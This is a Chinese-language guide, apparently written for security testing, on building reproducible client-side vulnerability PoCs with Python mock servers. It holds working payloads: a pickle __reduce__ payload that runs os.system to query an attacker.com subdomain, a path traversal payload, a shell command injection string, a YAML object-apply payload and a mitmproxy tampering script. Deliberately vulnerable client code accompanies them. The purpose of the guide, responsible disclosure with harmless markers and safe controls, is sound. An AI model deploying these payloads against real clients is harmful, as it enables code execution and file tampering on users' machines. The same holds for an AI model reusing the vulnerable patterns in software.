---
description: Counter 客户端漏洞可复现 PoC 生成——用 Mock 服务器证明信任崩塌
tags: [counter, poc-generator, mock-server, reproducible, claim-chain, harmless-poc]
---

# Counter PoC 生成器：用 Mock 服务器铸造不可辩驳的证据

> Counter 场景的 PoC 不是向服务器发送恶意请求，而是架设一个 Mock 服务器，让它向客户端投喂恶意响应。你的目标是：任何人克隆你的代码、运行你的脚本，都能在 5 分钟内复现客户端的自我毁灭。

---

## 1. 触发器：什么情况下必须生成可复现 PoC？

- 发现了客户端漏洞，但需要用独立环境向开发团队/安全审核者证明"这不是理论，这是必然"。
- 漏洞涉及多个组件（客户端 + 服务器 + 网络层），需要剥离出最小可复现集合。
- 需要在不触碰生产服务器、不修改生产客户端的前提下，验证漏洞假设。
- 漏洞的利用条件存在争议（如"需要特定版本""需要特定配置"），需要用 PoC 消除不确定性。
- 需要为漏洞报告提供符合行业标准的证据链（Claim Chain）。

---

## 2. 问题链：PoC 设计前不可跳过的 6 个问题

**Q1：PoC 的最小依赖边界是什么？**
> 是否仅需要 Python 标准库（`http.server`、`socketserver`、`json`）即可构建 Mock 服务器？还是需要模拟 TLS、WebSocket、Protobuf 等复杂协议？PoC 的依赖越少，复现率越高。

**Q2：Mock 服务器需要精确模拟目标服务器的哪些协议特征？**
> 客户端是否严格校验 `Content-Type`？是否依赖特定的 HTTP Header（如 `X-API-Version`）？是否要求 TLS 证书来自特定 CA？是否需要特定的响应延迟或分块传输（chunked encoding）？

**Q3：无害 Payload 的成功指标是什么，如何在不破坏系统的情况下形成不可辩驳的证据？**
> 选择 DNS 外带（证明代码执行）、临时文件写入（证明文件系统越界）、进程列表读取并回显（证明命令执行）、或客户端日志中的特定标记字符串（证明响应被篡改且被客户端处理）。

**Q4：PoC 是否需要模拟中间人环境，还是仅模拟恶意服务器就足够？**
> 如果漏洞依赖 MITM（如 TLS 降级、证书绕过），PoC 是否需要集成 `mitmproxy` 脚本或自签名 CA？如果漏洞仅依赖服务器响应内容，则简单的 HTTP Mock 即可。

**Q5：PoC 是否必须在目标客户端的相同操作系统和运行时版本上运行？**
> Windows 与 Linux 的路径分隔符、命令语法、默认 Shell 均不同。PoC 是否需要在多平台测试？Payload 是否需要根据 `platform.system()` 自动适配？

**Q6：如何记录和固化证据链（Claim Chain），使得第三方可以独立验证每一步？**
> 是否需要 Wireshark/tcpdump 抓包？是否需要客户端的详细运行日志？是否需要录制屏幕或输出时间戳化的控制台日志？

---

## 3. 攻击链闭合：PoC 的 Claim Chain 结构

Counter 漏洞的 PoC 必须构建一条完整的"主张链"（Claim Chain），每一步主张都必须有对应的可观测证据支撑。

```
Claim 1: 攻击者可以控制服务器响应（Mock 服务器代码 + 运行截图）
    ↓ 证据：Mock 服务器源代码、启动日志、监听端口证明
Claim 2: 客户端会主动向 Mock 服务器发起请求（网络抓包 / 客户端日志）
    ↓ 证据：tcpdump 显示 SYN → ACK → HTTP GET 完整三次握手和请求
Claim 3: 客户端接收并解析了 Mock 服务器返回的恶意响应（客户端调试日志）
    ↓ 证据：客户端日志显示接收到 HTTP 200，且响应体长度与 Payload 一致
Claim 4: 解析过程触发了危险代码路径（栈跟踪 / 代码覆盖率 / 动态调试）
    ↓ 证据：覆盖率报告显示 `pickle.loads()` / `os.system()` / `open()` 被调用
Claim 5: 可观测的无害后果已经发生（DNS 查询记录 / 临时文件 / 标记日志）
    ↓ 证据：DNS 服务器日志显示查询请求；`ls /tmp/poc_*` 显示文件存在
Claim 6: 该后果唯一来源于恶意响应（对照实验：正常响应不产生该后果）
    ↓ 证据：运行对照组 Mock 服务器（返回正常响应），确认无害后果消失
```

**Claim Chain 的数学意义：**

如果 `P(后果|恶意响应) ≈ 1` 且 `P(后果|正常响应) ≈ 0`，则根据贝叶斯推断，该后果是漏洞存在的充分证据。

---

## 4. 代码示例：可复现 PoC 工程手册

### PoC 一：Python Mock 服务器 + 反序列化触发

**目标**：证明客户端在处理服务器返回的 Pickle 数据时会执行任意代码。

**Mock 服务器（`mock_server_pickle.py`）：**
```python
#!/usr/bin/env python3
"""
Counter PoC: Mock Server returning malicious Pickle payload.
Claim Chain: Server control → Client request → Pickle parse → DNS OOB proof.
"""
import pickle
import os
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler

# 无害 Proof: 触发 DNS 查询到 attacker-controlled subdomain
class ProofOfConcept:
    def __reduce__(self):
        unique_id = os.urandom(4).hex()
        cmd = f"nslookup poc-{unique_id}.attacker.com"
        return (os.system, (cmd,))

PAYLOAD = pickle.dumps(ProofOfConcept())

class MockHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # 静默日志，避免污染输出
        pass

    def do_GET(self):
        if self.path == "/api/config":
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(PAYLOAD)))
            self.end_headers()
            self.wfile.write(PAYLOAD)
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8080), MockHandler)
    print("[*] Mock Pickle Server listening on http://0.0.0.0:8080")
    print("[*] Endpoint: GET /api/config")
    print(f"[*] Payload size: {len(PAYLOAD)} bytes")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
```

**客户端触发示例（脆弱代码）：**
```python
import pickle
import urllib.request

VULN_SERVER = "http://127.0.0.1:8080"
resp = urllib.request.urlopen(f"{VULN_SERVER}/api/config")
# 致命：将服务器字节直接反序列化
data = pickle.loads(resp.read())
print("Client received:", data)
```

**运行与验证：**
```bash
# Terminal 1: 启动 Mock 服务器
python mock_server_pickle.py

# Terminal 2: 运行脆弱客户端
python vulnerable_client.py

# Terminal 3: 检查 DNS 查询（如果使用本地 DNS 日志或 tcpdump）
sudo tcpdump -i any port 53 | grep "poc-"
# 预期输出：观察到对 poc-XXXX.attacker.com 的 DNS 查询
```

**安全对照组：**
```python
# safe_server.py: 返回正常 JSON 而非 Pickle
class SafeHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"theme":"dark","timeout":30}')
# 运行安全对照组后，确认 DNS 查询不再发生
```

---

### PoC 二：路径遍历文件写入证明

**目标**：证明客户端会将服务器控制的文件名拼接进本地文件系统，导致越界写入。

**Mock 服务器：**
```python
#!/usr/bin/env python3
import json
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler

MARKER_CONTENT = b"COUNTER_PATH_TRAVERSAL_POC"
PAYLOAD = json.dumps({
    "asset_name": "../../../tmp/counter_path_traversal_proof",
    "content_b64": base64.b64encode(MARKER_CONTENT).decode()
}).encode()

class MockHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == "/api/asset":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(PAYLOAD)
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8081), MockHandler)
    print("[*] Mock Path-Traversal Server on http://0.0.0.0:8081")
    server.serve_forever()
```

**脆弱客户端：**
```python
import os
import json
import base64
import urllib.request

VULN_SERVER = "http://127.0.0.1:8081"
resp = urllib.request.urlopen(f"{VULN_SERVER}/api/asset")
data = json.loads(resp.read())

asset_name = data["asset_name"]
content = base64.b64decode(data["content_b64"])

# 脆弱：直接拼接
save_path = os.path.join("/var/app/data", asset_name)
os.makedirs(os.path.dirname(save_path), exist_ok=True)
with open(save_path, "wb") as f:
    f.write(content)
print(f"Saved to: {save_path}")
```

**验证命令：**
```bash
# 运行客户端后检查
ls -la /tmp/counter_path_traversal_proof
# 预期：文件存在，内容为 COUNTER_PATH_TRAVERSAL_POC
cat /tmp/counter_path_traversal_proof
```

**安全对照组：**
```python
# 客户端使用白名单 + 路径解析校验
from pathlib import Path
BASE_DIR = Path("/var/app/data").resolve()
path = (BASE_DIR / asset_name).resolve()
if not path.is_relative_to(BASE_DIR):
    raise SecurityError("Blocked")
# 运行后确认文件未写入 /tmp/
```

---

### PoC 三：命令注入证明

**目标**：证明客户端将服务器返回的字符串直接传入 Shell 执行，导致命令注入。

**Mock 服务器：**
```python
#!/usr/bin/env python3
import json
from http.server import HTTPServer, BaseHTTPRequestHandler

PAYLOAD = json.dumps({
    "hosts_entry": "127.0.0.1 localhost; echo COUNTER_CMD_INJECTION_POC > /tmp/cmd_injection_proof"
}).encode()

class MockHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/hosts":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(PAYLOAD)
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8082), MockHandler).serve_forever()
```

**脆弱客户端：**
```python
import os
import json
import urllib.request

VULN_SERVER = "http://127.0.0.1:8082"
resp = urllib.request.urlopen(f"{VULN_SERVER}/api/hosts")
entry = json.loads(resp.read())["hosts_entry"]
# 脆弱：字符串直接进入 Shell
os.system(f"echo {entry} >> /etc/hosts")
```

**验证：**
```bash
ls /tmp/cmd_injection_proof && cat /tmp/cmd_injection_proof
# 预期：文件存在，内容为 COUNTER_CMD_INJECTION_POC
```

---

### PoC 四：MITM 响应篡改 + 客户端配置注入

**目标**：证明即使客户端与"真实"服务器通信，中间人也可以篡改响应并影响客户端行为。

**mitmproxy 脚本（`mitm_poc.py`）：**
```python
from mitmproxy import http

TARGET_HOST = "api.example.com"
INJECTION_MARKER = '"_poc_mitm": "injected"'

def response(flow: http.HTTPFlow) -> None:
    if TARGET_HOST in flow.request.pretty_host:
        if flow.request.path == "/v1/config":
            original = flow.response.text
            # 在 JSON 末尾注入标记字段
            if original.rstrip().endswith("}"):
                modified = original.rstrip()[:-1] + f', {INJECTION_MARKER}}}'
                flow.response.text = modified
                print(f"[MITM PoC] Injected into {flow.request.url}")
```

**验证方式：**
```bash
# 1. 启动 mitmproxy
mitmproxy -s mitm_poc.py --listen-port 8080

# 2. 配置客户端使用 http://localhost:8080 作为代理
# 3. 观察客户端日志：如果客户端解析并使用了 _poc_mitm 字段，
#    或客户端因未知字段报错，均证明 MITM 篡改成功
```

---

### PoC 五：YAML 反序列化触发

**Mock 服务器：**
```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

# 无害 PoC：仅读取环境变量并写入临时文件证明执行
YAML_PAYLOAD = b"""
settings:
  theme: dark
  # 利用 YAML 标签执行本地命令
  proof: !!python/object/apply:subprocess.check_output
    - ["sh", "-c", "echo COUNTER_YAML_POC > /tmp/yaml_poc_proof"]
"""

class MockHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/settings":
            self.send_response(200)
            self.send_header("Content-Type", "application/x-yaml")
            self.end_headers()
            self.wfile.write(YAML_PAYLOAD)
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8083), MockHandler).serve_forever()
```

**脆弱客户端：**
```python
import yaml
import urllib.request

VULN_SERVER = "http://127.0.0.1:8083"
resp = urllib.request.urlopen(f"{VULN_SERVER}/api/settings")
# 使用不安全的默认 Loader
data = yaml.load(resp, Loader=yaml.Loader)
```

---

## 5. PoC 交付标准与无害化原则

```
□ 一键运行：提供启动脚本（start_mock.sh / start_mock.ps1），5 分钟内完成复现
□ 零外部依赖：优先使用 Python 标准库，如需第三方库（mitmproxy）明确列出安装命令
□ 无害证据：所有 Payload 仅产生 DNS 查询、临时文件写入、标记字符串输出
□ 对照实验：同时提供脆弱代码和安全代码，证明漏洞可被修复且修复后不再复现
□ 证据固化：提供预期的终端输出、文件内容、日志片段作为"成功复现"的判定标准
□ 平台声明：明确说明 PoC 测试过的操作系统和 Python 版本
□ 清理脚本：提供 cleanup.sh 删除所有 PoC 产生的临时文件和日志
```
